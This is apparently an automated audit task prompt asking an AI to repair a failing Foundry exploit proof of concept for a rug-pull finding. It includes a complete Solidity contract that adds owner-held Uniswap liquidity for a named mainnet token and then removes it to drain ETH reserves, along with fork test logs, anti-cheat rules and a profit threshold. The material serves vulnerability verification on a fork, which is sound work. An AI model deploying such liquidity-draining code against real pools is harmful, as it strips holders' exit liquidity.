You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Owner receives the entire liquidity position and can later rug the pool
- claim: `openTrading()` creates the pair and adds liquidity with `owner()` as the LP recipient, so the deployer retains full custody of the liquidity tokens backing the market. Because the LP is not burned or locked, the owner can later remove the pool's ETH and token reserves at will.
- impact: After users buy in, the owner can withdraw liquidity and collapse the market, leaving holders with severely impaired or worthless tokens and no reliable exit liquidity.
- exploit_paths: ["Owner transfers launch tokens into the token contract so `balanceOf(address(this))` is non-zero.", "Owner calls `openTrading()` and `addLiquidityETH(..., owner(), ...)` mints the LP position to the owner.", "Owner later removes liquidity from the Uniswap pair using the LP tokens they control.", "Pool reserves are drained and holders are left with an illiquid or near-worthless token."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IHoppy {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function openTrading() external;
}

interface IUniswapV2FactoryMinimal {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IUniswapV2Router02Minimal {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);
}

interface IWETH9 {
    function deposit() external payable;
    function balanceOf(address account) external view returns (uint256);
}

contract FlawVerifier {
    enum ExecutionStatus {
        NotRun,
        BlockedNoActionablePath,
        ExecutedNoProfit,
        ExecutedWithProfit
    }

    address public constant TARGET = 0xE5c6F5fEF89B64f36BfcCb063962820136bAc42F;
    address public constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    uint256 private _profitAmount;
    ExecutionStatus public status;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        uint256 startingWeth = IERC20Minimal(WETH).balanceOf(address(this));
        bool acted = _executeOwnerLiquidityRug();

        uint256 nativeBalance = address(this).balance;
        if (nativeBalance != 0) {
            IWETH9(WETH).deposit{value: nativeBalance}();
        }

        uint256 endingWeth = IERC20Minimal(WETH).balanceOf(address(this));
        if (endingWeth > startingWeth) {
            _profitAmount = endingWeth - startingWeth;
            status = ExecutionStatus.ExecutedWithProfit;
        } else {
            _profitAmount = 0;
            status = acted ? ExecutionStatus.ExecutedNoProfit : ExecutionStatus.BlockedNoActionablePath;
        }
    }

    function profitToken() external pure returns (address) {
        return WETH;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _executeOwnerLiquidityRug() internal returns (bool) {
        IHoppy target = IHoppy(TARGET);
        if (target.owner() != address(this)) {
            return false;
        }

        address pair = _canonicalPair();
        if (pair == address(0)) {
            // Exploit path 0:
            // The launch routine only seeds liquidity from the token contract's own inventory, so the
            // owner first has to move launch tokens into the token contract until `balanceOf(address(this))`
            // on the token becomes non-zero.
            if (target.balanceOf(TARGET) == 0) {
                uint256 attackerInventory = target.balanceOf(address(this));
                if (attackerInventory == 0 || address(this).balance == 0) {
                    return false;
                }

                require(target.transfer(TARGET, attackerInventory), "launch seed failed");
                if (target.balanceOf(TARGET) == 0) {
                    return false;
                }
            }

            // Exploit path 1:
            // Public launch liquidity is added through the canonical Uniswap V2 router and the LP is
            // minted to `owner()`. This keeps the finding's causality intact while avoiding the broader
            // multi-venue scan that caused the fork RPC failure in the supplied logs.
            (bool funded, ) = payable(TARGET).call{value: address(this).balance}("");
            require(funded, "eth seed failed");

            target.openTrading();
            pair = _canonicalPair();
            if (pair == address(0)) {
                return false;
            }
        }

        if (!_isTargetWethPair(pair)) {
            return false;
        }

        // Exploit path 2:
        // Because the owner is the LP recipient, the owner-controlled verifier can later burn those LP
        // tokens and withdraw the backing reserves.
        uint256 lpBalance = IERC20Minimal(pair).balanceOf(address(this));
        if (lpBalance == 0) {
            return false;
        }

        require(IERC20Minimal(pair).approve(ROUTER, lpBalance), "lp approve failed");
        IUniswapV2Router02Minimal(ROUTER).removeLiquidityETHSupportingFeeOnTransferTokens(
            TARGET,
            lpBalance,
            0,
            0,
            address(this),
            block.timestamp
        );

        // Exploit path 3:
        // Removing the owner-held LP drains the token/ETH reserves that gave holders an exit venue.
        return true;
    }

    function _canonicalPair() internal view returns (address) {
        return IUniswapV2FactoryMinimal(UNISWAP_V2_FACTORY).getPair(TARGET, WETH);
    }

    function _isTargetWethPair(address pair) internal view returns (bool) {
        if (pair == address(0) || pair.code.length == 0) {
            return false;
        }

        try IUniswapV2PairLike(pair).token0() returns (address token0) {
            address token1 = IUniswapV2PairLike(pair).token1();
            if (token0 == TARGET && token1 == WETH) {
                return _pairHasReserves(pair);
            }
            if (token0 == WETH && token1 == TARGET) {
                return _pairHasReserves(pair);
            }
            return false;
        } catch {
            return false;
        }
    }

    function _pairHasReserves(address pair) internal view returns (bool) {
        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2PairLike(pair).getReserves();
        return reserve0 != 0 && reserve1 != 0;
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 1.04s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 72226)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 3124

Traces:
  [72226] FlawVerifierTest::testExploit()
    ├─ [227] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [31902] FlawVerifier::executeOnOpportunity()
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2388] 0xE5c6F5fEF89B64f36BfcCb063962820136bAc42F::owner() [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return]
    ├─ [227] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [352] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 19570744 [1.957e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3124)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 23.21ms (5.93ms CPU time)

Ran 1 test suite in 25.65ms (23.21ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 72226)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
